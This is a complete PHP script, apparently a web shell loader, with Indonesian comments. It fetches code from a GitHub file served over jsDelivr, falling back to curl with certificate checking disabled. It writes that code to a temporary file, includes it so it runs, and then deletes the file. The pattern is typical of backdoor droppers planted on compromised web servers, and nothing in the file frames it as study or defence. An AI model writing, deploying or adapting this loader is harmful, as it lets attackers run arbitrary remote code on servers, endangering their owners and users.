<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function getRemoteCode($url) {
    $code = @file_get_contents($url);
    
    if ($code === false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $code = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code !== 200 || empty($code)) {
            return false;
        }
    }
    return $code;
}

if (!function_exists('get_magic_quotes_gpc')) {
    function get_magic_quotes_gpc() {
        return false;
    }
}

$url = "https://cdn.jsdelivr.net/gh/Ahmad-Fauzi-max/memek@main/MMCT.txt";
$code = getRemoteCode($url);

if ($code !== false) {
    try {
        ob_start();
        
        // Tulis kode apa adanya ke file sementara tanpa menambahkan <?php
        $tempFile = tempnam(sys_get_temp_dir(), 'remote_code_');
        file_put_contents($tempFile, $code);
        include $tempFile;
        unlink($tempFile); 
        
        ob_end_flush();
    } catch (Throwable $e) {
        ob_end_clean();
        die("Terjadi kesalahan dalam eksekusi kode: " . $e->getMessage());
    }
} else {
    die("Gagal mengambil data dari URL.");
}
?>
